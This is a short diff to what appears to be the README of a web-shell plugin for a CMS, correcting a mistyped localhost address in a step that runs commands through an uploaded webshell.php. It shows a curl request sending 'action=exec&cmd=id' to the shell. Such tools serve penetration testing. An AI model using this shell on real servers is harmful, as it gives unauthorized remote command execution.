@@ -27,7 +27,7 @@ Go to "Configuration --> plugins" page, at http://localhost:10080/index.php/admi
 
 ### Step 2.1: Executing commands
 
-You can now execute commands by sending a GET or POST request to http://127.0.01/upload/plugins/WebShell/webshell.php with `action=exec&cmd=id`:
+You can now execute commands by sending a GET or POST request to http://127.0.0.1/upload/plugins/WebShell/webshell.php with `action=exec&cmd=id`:
 
 ```sh
 $ curl -X POST 'http://localhost:10080/upload/plugins/WebShell/webshell.php' --data "action=exec&cmd=id"
